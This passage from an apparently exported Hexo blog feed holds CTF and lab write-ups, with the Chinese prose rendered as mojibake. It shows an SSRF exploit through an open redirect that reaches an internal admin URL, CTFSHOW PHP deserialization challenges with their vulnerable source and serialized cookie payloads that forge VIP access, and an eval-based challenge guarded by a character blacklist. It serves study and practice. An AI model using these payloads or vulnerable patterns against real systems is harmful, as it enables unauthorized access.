<p>ä¾‹å¦‚ï¼Œå‡è®¾åº”ç”¨ç¨‹åºåŒ…å«ä¸€ä¸ªå¼€æ”¾é‡å®šå‘æ¼æ´ï¼Œå…¶ä¸­åŒ…å«ä»¥ä¸‹ URLï¼š</p>
<blockquote>
<p>&#x2F;product&#x2F;nextProduct?currentProductId&#x3D;6&amp;path&#x3D;<a href="http://evil-user.net/">http://evil-user.net</a></p>
<p>è¿”å›é‡å®šå‘åˆ°ï¼š</p>
</blockquote>
<blockquote>
<p><a href="http://evil-user.net/">http://evil-user.net</a></p>
<p>å¯ä»¥åˆ©ç”¨å¼€æ”¾é‡å®šå‘æ¼æ´ç»•è¿‡URLè¿‡æ»¤ï¼Œåˆ©ç”¨SSRFæ¼æ´ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š</p>
</blockquote>
<blockquote>
<p>POST &#x2F;product&#x2F;stock HTTP&#x2F;1.0<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 118</p>
<p>stockApi&#x3D;<a href="http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin">http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin</a></p>
</blockquote>
<p>æ­¤ SSRF æ¼æ´åˆ©ç”¨ä¹‹æ‰€ä»¥æœ‰æ•ˆï¼Œæ˜¯å› ä¸ºåº”ç”¨ç¨‹åºé¦–å…ˆéªŒè¯æä¾›çš„stockAPIURL æ˜¯å¦ä½äºå…è®¸çš„åŸŸä¸­ï¼Œè€Œäº‹å®ç¡®å®å¦‚æ­¤ã€‚ç„¶ååº”ç”¨ç¨‹åºè¯·æ±‚æä¾›çš„ URLï¼Œè¿™ä¼šè§¦å‘æ‰“å¼€é‡å®šå‘ã€‚å®ƒéµå¾ªé‡å®šå‘ï¼Œå¹¶å‘æ”»å‡»è€…é€‰æ‹©çš„å†…éƒ¨ URL å‘å‡ºè¯·æ±‚ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/b4f66ec9c7e141559dcda56eb0c4d290.png" alt="1"><br>éšä¾¿ç‚¹å‡»ä¸€ä¸ªå•†å“æŸ¥çœ‹ï¼Œ<br><img src="https://img-blog.csdnimg.cn/a3dfeecba0264eae985665d931c208dc.png" alt="2"><br>å¼€å¯bpï¼ŒæŠ“åŒ…ã€‚<br><img src="https://img-blog.csdnimg.cn/f9443ac138fa44038a6e14964f76223f.png" alt="2"><br>urlè§£ç åå¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/b79f6f94ab294bfdba0e2ff7120e77dc.png" alt="3"><br>ç»§ç»­æŠ“åŒ…ï¼Œçœ‹ä¸‹ä¸€ä¸ªäº§å“ã€‚<br><img src="https://img-blog.csdnimg.cn/ca3696e6f3df4d00b88f4ee58d5d8b3a.png" alt="2"><br>å­˜åœ¨é‡å®šå‘ï¼Œå¤åˆ¶GETå†…å®¹ï¼Œæ”¾åˆ°stockapié‡Œ<br><img src="https://img-blog.csdnimg.cn/e3c347adb82a4416b369238ce4d8689c.png" alt="4"><br>æ”¹pathï¼Œ<br><img src="https://img-blog.csdnimg.cn/19fc3e9644984ea49b28a1ec8cb0233c.png" alt="5"><br>æˆåŠŸåˆ é™¤ï¼ï¼<br><img src="https://img-blog.csdnimg.cn/b151769e345a447eaa8b0fc724cd368e.png" alt="6"></p>
]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡åšå®¢ç½‘é¡µå›¾ç‰‡åœ¨éƒ¨ç½²åæ— æ³•æ˜¾ç¤ºçš„é—®é¢˜</title>
    <url>/2023/03/09/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E7%BD%91%E9%A1%B5%E5%9B%BE%E7%89%87%E5%9C%A8%E9%83%A8%E7%BD%B2%E5%90%8E%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>æˆ‘å¹³å¸¸å†™åšå®¢å°±æ˜¯å…ˆåœ¨csdnä¸Šå®Œæˆåå†å¤åˆ¶ç²˜è´´åˆ°hexoåšå®¢ä¸­ï¼Œè¿™æ ·å®¹æ˜“å¼•å…¥å›¾ç‰‡ï¼Œä»Šå¤©é‡åˆ°ä¸€ä¸ªé—®é¢˜å°±æ˜¯åœ¨éƒ¨ç½²åå‘ç°hexoåšå®¢æ— æ³•æ˜¾ç¤ºå›¾ç‰‡äº†ã€‚</p>
<h2 id="è§£å†³é—®é¢˜"><a href="#è§£å†³é—®é¢˜" class="headerlink" title="è§£å†³é—®é¢˜"></a>è§£å†³é—®é¢˜</h2><p>æ–¹æ³•å…¶å®å¾ˆç®€å•ï¼Œåªéœ€è¦æ–‡ç« çš„å¤´éƒ¨å¦‚ä¸‹å›¾æ‰€ç¤ºä½ç½®æ·»åŠ è¿™ä¸€å¥è¯å°±å¯ä»¥å®Œç¾è§£å†³é—®é¢˜</p>
<p><img src="https://img-blog.csdnimg.cn/5616d0a30e614287881b0ae1a13cb8ff.png" alt="2"></p>
]]></content>
      <categories>
        <category>åšå®¢</category>
      </categories>
  </entry>
  <entry>
    <title>CTFSHOW-ååºåˆ—åŒ–</title>
    <url>/2023/03/08/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>é¦–å…ˆå®šä¹‰ä¸€ä¸ªç±»<strong>ctfShowUser</strong>ï¼Œåˆ›å»ºå…¬å…±å˜é‡<code>$usernameï¼Œ$passwordï¼Œ$isVip</code>ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å°†cookieååºåˆ—åŒ–ï¼Œcookieç”¨userä¼ å…¥ã€‚æ€»ä½“æ€è·¯ä¹Ÿå°±æ˜¯GETä¼ å…¥usernameå’Œpasswordç„¶åå°†cookieè¿›è¡Œååºåˆ—åŒ–ã€‚ç”±äº<code>public $isVip=false;public function checkVip()&#123;        return $this-&gt;isVip;    &#125;</code>ï¼Œæ‰€ä»¥è¦å°†checkvipå›æ˜¾ä¸ºçœŸã€‚å¹¶ä¸”è·å¾—å°†cookieçš„useråºåˆ—åŒ–åçš„ä»£ç ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ‰§è¡Œç»“æœä¸º<code>O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code><br><img src="https://img-blog.csdnimg.cn/232c87cffaf54618987f47609eea9756.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/8ad56eb636804a2d8bb55c4f918fe918.png" alt="2">å¾—åˆ°flagã€‚</p>
<h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>é‡ä¸Šé¢˜çš„åŒºåˆ«å°±æ˜¯å¢åŠ äº†ä¸€ä¸ªæ¡ä»¶<code>if($this-&gt;username!==$this-&gt;password)</code>å°±æ˜¯usernameä¸ç­‰äºpasswordã€‚å†™ä»£ç ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>
		<span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>
		<span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'dfgh'</span><span class="token punctuation">;</span>
		<span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿è¡Œåå¾—åˆ°<code>O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A8%3A%22username%22%3Bs%3A4%3A%22dfgh%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3B%7D</code><br>å…¶ä½™ä¸ä¸Šé¢˜ä¸€æ ·ã€‚</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>å—äº¬æ£®æ—è­¦å¯Ÿå­¦é™¢CTF</title>
    <url>/2023/03/04/%E5%8D%97%E4%BA%AC%E6%A3%AE%E6%9E%97%E8%AD%A6%E5%AF%9F%E5%AD%A6%E9%99%A2CTF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="è¿™æ˜¯ä¸€é“æ¯”è¾ƒç®€å•çš„webé¢˜ç›®"><a href="#è¿™æ˜¯ä¸€é“æ¯”è¾ƒç®€å•çš„webé¢˜ç›®" class="headerlink" title="è¿™æ˜¯ä¸€é“æ¯”è¾ƒç®€å•çš„webé¢˜ç›®"></a>è¿™æ˜¯ä¸€é“æ¯”è¾ƒç®€å•çš„webé¢˜ç›®</h2><p><img src="https://img-blog.csdnimg.cn/f5b19dbc39a34b3e9bf5650b3795ae5e.png" alt="1"><br>å°†ä¸‰å¼ ç…§ç‰‡éƒ½ä¿å­˜ä¸‹æ¥ï¼Œç„¶åæ‹¼å›¾ã€‚å‘ç°ç¬¬ä¸€å¼ åäº†ï¼Œå°†ç¬¬ä¸€å¼ å€’ç½®è¿‡æ¥æ‹¼å›¾ç„¶åæ‰«ç <br><img src="https://img-blog.csdnimg.cn/755c10249c564270ab3d4f00f01c7b07.png" alt="2"><br>æ‰«è¿‡åå¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/6938f6a4f37345738d5975c6a384ccc4.png" alt="3"><br>é‚£å°±è®¿é—®&#x2F;vbnp.php<br>å¾—åˆ°</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å°†<strong>t</strong>  ,<strong>r</strong>   ,<strong>n</strong>,  <strong>â€˜</strong>  ,<strong>â€œ</strong>,  <strong>&#96;</strong>,  <strong>[</strong>,  <strong>]</strong>,  <strong>$</strong>,  *<em>*</em>,  <strong>^</strong>è¿‡æ»¤äº†</p>
<blockquote>
